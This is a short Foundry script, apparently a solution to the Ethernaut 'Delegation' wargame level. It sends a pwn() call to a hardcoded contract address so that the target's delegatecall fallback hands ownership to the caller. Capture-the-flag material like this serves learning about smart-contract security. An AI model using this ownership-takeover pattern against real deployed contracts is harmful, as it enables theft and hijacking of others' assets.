// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Delegation, Delegate} from "../src/Delegation.sol";

contract DelegationSolution is Script {
    function run() external {
        address inst = 0x74b2f505b6689cFfdf9ae10170C2Ac18b258CA90;
        vm.startBroadcast();
        (bool success, ) = address(inst).call(abi.encodeWithSignature("pwn()"));
        require(success, "Call failed");

        vm.stopBroadcast();
    }
}